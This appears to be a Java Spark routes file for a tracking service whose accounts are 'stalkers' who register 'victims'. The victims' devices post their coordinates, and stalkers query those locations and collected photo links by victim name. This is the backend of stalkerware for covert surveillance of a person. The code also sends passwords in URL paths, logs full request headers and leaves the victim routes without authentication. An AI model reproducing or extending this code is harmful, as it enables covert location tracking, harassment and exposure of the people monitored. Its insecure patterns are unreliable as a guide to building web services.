import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonObject;
import com.google.gson.JsonSyntaxException;
import hibernateManagers.StalkerManager;
import hibernateManagers.VictimManager;
import hibernateManagers.users.Cordinates;
import hibernateManagers.users.Photo;
import hibernateManagers.users.Stalker;
import hibernateManagers.users.Victim;
import spark.Request;
import spark.Response;
import spark.Route;
import utils.LogerSingleton;
import utils.RandomStringGenerator;

import java.util.LinkedList;
import java.util.logging.Level;
import java.util.logging.Logger;

import static spark.Spark.get;
import static spark.Spark.post;


public class Routes {

    private final Logger logger = LogerSingleton.getInstance().getLogger();
    private StalkerManager stalkerManager = null;
    private VictimManager victimManager = null;
    private Gson gson;

    public Routes() {

        get("/test", testRoute);

        //----------------------------------------STALKER ROUTES--------------------------------------------------------
        post("/stalker/addStalker", addStalker); //adds stalker from body //tested
        get("/stalker/getStalker/:name/:password", getStalker); //tested


        //----------------------------------------VICTIM ROUTES---------------------------------------------------------
        post("/victim/updatesParams/:nameVictim", updateParams); //update last cordinates of VIVTIM with id= :id //tested
        post("/victim/addVictim/:idStalker", addVictim); //adds VICTIM //tested
        get("/victim/getVictim/:id", getVictim); //tested
        get("/victim/getCords/:name", getCords); //tested
        get("/victim/links/:victimId/:link", addLink); //tested
        get("/victim/links/:victim", getLinks);//tested


        stalkerManager = new StalkerManager();
        victimManager = new VictimManager();

        gson = new GsonBuilder()
                .setDateFormat("dd-MM-yyyy")
                .excludeFieldsWithoutExposeAnnotation()
                .create();

    }

    /**
     * Routes that returns success for every request
     */
    public Route testRoute = (Request request, Response response) ->
    {
        //  logger.log (Level.INFO, "test by: " + request.ip () + " " + request.headers ());
        //  System.out.println ("working test");
        JsonObject jsonObject = new JsonObject();
        jsonObject.addProperty("success", "true");

        return jsonObject;
    };

    /**
     * Route that takes in post request and adds Stalker to DB
     */
    public Route addStalker = (Request req, Response res) ->
    {
        res.type("application/json");
        System.out.println("working");
        Stalker stalker = null;
        try {
            stalker = gson.fromJson(req.body(), Stalker.class);
            stalkerManager.addStalkerFromObject(stalker);
            return gson.toJson("{\"Success\":\"true\"}");
        } catch (JsonSyntaxException e) {
            e.printStackTrace();
        }
        return new Gson().toJson("{\"Success\":\"false\"}");
    };

    /**
     * Route that is used for logging in
     * login and hashed password is provided in
     * http request header
     */
    public Route getStalker = (Request req, Response res) ->
    {

        res.type("application/json");
        logger.log(Level.INFO, "getStalker by: " + req.ip() + " " + req.headers());

        String ret = "";

        String reqCookie = req.cookie("sesionid");
        if (reqCookie != null && SingletonLoginController.getInstance().check(reqCookie)) {
            logger.log(Level.INFO, "Found cookie");

            JsonObject jsonObject = new JsonObject();
            jsonObject.addProperty("success", "true");
            return jsonObject;
        } else {

            if (stalkerManager.login(req.params(":name"), req.params(":password"))) {

                String id = RandomStringGenerator.getInstance().getHashID(10);

                SingletonLoginController.getInstance().addSession(req.params(":name"), id);
                res.cookie("sesionid", id, 100000);
                logger.log(Level.INFO, "generated Cookie id : " + id);

                JsonObject jsonObject = new JsonObject();

                jsonObject.addProperty("success", "true");
                return jsonObject;

            }
        }

        JsonObject jsonObject = new JsonObject();
        jsonObject.addProperty("success", "false");

        return jsonObject;
    };

    /**
     * Route that takes in name of victim
     * and updates params of coordinates
     */
    public Route updateParams = (Request req, Response res) ->
    {

        String nameVictim = req.params(":nameVictim");

        Victim victim = victimManager.getVictimByName(nameVictim);

        try {
            System.out.println(req.body());
            Cordinates cordinates = new Gson().fromJson(req.body(), Cordinates.class);
            System.out.println(cordinates);
            victim.setCordinatesx(Double.parseDouble(cordinates.getX()));
            victim.setCordinatesy(Double.parseDouble(cordinates.getY()));
            victimManager.updateCordinates(victim);
        } catch (Exception ex) {
            ex.printStackTrace();
        }

        return gson.toJson("SUCCESS");
    };

    /**
     * Route used for adding victims from post request
     */
    public Route addVictim = (Request req, Response res) ->
    {
        try {

            Victim victim = gson.fromJson(req.body(), Victim.class);

            String idVictim = req.params(":idStalker");

            Stalker stalker = stalkerManager.getStalker(Integer.parseInt(idVictim));

            victim.setStalker(stalker);

            if (victimManager.addVictim(victim) != null) {

                return gson.toJson("SUCCESS");
            } else {
                logger.log(Level.SEVERE, "addVivtim Failed by: " + req.ip() + " " + req.headers());
                return gson.toJson("ERROR");
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            ;
            return ex.getMessage();
        }
    };
    /**
     * Route used to get victim from provided id
     * in Http header
     */
    public Route getVictim = (Request req, Response res) ->
    {

        try {
            Integer id = Integer.parseInt(req.params(":id"));

            Victim victim = victimManager.getVictim(id);

            if (victim != null) {

                logger.log(Level.INFO, "getVictim by: " + req.ip() + " " + req.headers());
                return gson.toJson(victim);
            } else {

                logger.log(Level.SEVERE, "getVictim Failed by: " + req.ip() + " " + req.headers());
                return gson.toJson("ERROR");
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            return ex.getMessage();
        }

    };

    /**
     * Route that allows to get Cords from name of Victim
     */
    public Route getCords = (Request req, Response res) ->
    {
        try {
            String victimName = req.params(":name");
            Cordinates cords = victimManager.getCordinates(victimName);

            logger.log(Level.INFO, cords.toString());
            logger.log(Level.SEVERE,gson.toJson(cords));
            return gson.toJsonTree(cords); //gson.toJson(cords);
        } catch (Exception ex) {
            ex.printStackTrace();
            return ex.getMessage();
        }
    };

    /**
     * Allows to get list of links
     * from name of victim
     */
    public Route getLinks = (Request req, Response res) ->
    {
        try {
            String victimName = req.params(":victim");
            Victim victim = victimManager.getVictimByName(victimName);
            LinkedList<String> links = new LinkedList<>();

            victimManager.getPhotos(victim).forEach(p -> {
                links.add(p.getLink());
            });
            return gson.toJson(links);
        } catch (Exception ex) {
            ex.printStackTrace();
            gson.toJson(ex.getMessage());
        }

        return gson.toJson("NULL");
    };

    /**
     * Allows to add link by id
     * link is provided in Http header
     * link has to formatted
     */
    public Route addLink = (Request req, Response res) ->
    {
        try {
            String victimId = req.params(":victimId");


            String link = req.params(":link");

            Photo photo = new Photo(link, victimManager.getVictim(Integer.parseInt(victimId)));

            victimManager.updloadPhoto(photo);

            return "completed";
        } catch (Exception ex) {
            ex.printStackTrace();
            return ex.getMessage();
        }
    };
}
